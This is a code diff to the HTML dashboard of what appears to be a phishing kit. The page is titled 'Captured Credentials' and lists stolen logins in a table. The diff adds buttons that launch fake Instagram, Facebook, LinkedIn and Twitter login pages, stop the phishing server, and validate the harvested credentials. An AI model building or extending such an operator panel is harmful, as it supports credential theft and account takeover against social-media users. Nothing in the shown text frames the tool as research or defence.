@@ -25,13 +25,50 @@
     tr:nth-child(even) {
       background-color: #f8f8f8;
     }
-    .logout {
+    .logout, .actions {
       margin-top: 1em;
+    }
+    .actions button {
+      margin-top: 2em;
+      padding: 0.5em 1em;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .actions button.stop {
+      background-color: #dc3545;
+    }
+    .validate {
+      background-color: #28a745;
     }
   </style>
 </head>
 <body>
   <h2>Captured Credentials</h2>
+
+  <div class="actions">
+    <form action="/launch/instagram" method="GET" style="display:inline;">
+      <button type="submit">Launch Instagram</button>
+    </form>
+    <form action="/launch/facebook" method="GET" style="display:inline;">
+      <button type="submit">Launch Facebook</button>
+    </form>
+    <form action="/launch/linkedin" method="GET" style="display:inline;">
+      <button type="submit">Launch Linkedin</button>
+    </form>
+    <form action="/launch/twitter" method="GET" style="display:inline;">
+      <button type="submit">Launch Twitter</button>
+    </form>
+    <form action="/stop_phishing" method="GET" style="display:inline;">
+      <button type="submit" class="stop">Stop Server</button>
+    </form>
+    <form action="/validate_now" method="GET" style="display:inline;">
+      <button type="submit" class="validate">Validate now</button>
+    </form>
+  </div>
+
   <table>
     <tr>
       <th>ID</th>
